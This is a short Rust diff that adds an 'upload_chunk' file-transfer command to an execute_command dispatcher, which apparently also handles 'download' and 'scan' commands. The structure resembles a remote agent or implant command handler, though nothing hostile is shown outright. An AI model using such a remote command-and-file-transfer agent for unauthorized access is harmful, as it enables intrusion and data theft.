@@ -43,6 +43,17 @@ pub fn execute_command(cmd: &str) -> String {
         return "Usage: download /path/to/save <base64data>".to_string();
     }
 
+    if cmd.starts_with("upload_chunk ") {
+        let payload = cmd.strip_prefix("upload_chunk ").unwrap().trim();
+        return match serde_json::from_str::<crate::filetransfer::UploadChunkRequest>(payload) {
+            Ok(request) => match crate::filetransfer::handle_upload_chunk(request) {
+                Ok(msg) => msg,
+                Err(e) => e,
+            },
+            Err(e) => format!("Error: {}", e),
+        };
+    }
+
     if cmd.starts_with("scan ") {
         let parts: Vec<&str> = cmd.split_whitespace().collect();
         if parts.len() >= 3 {
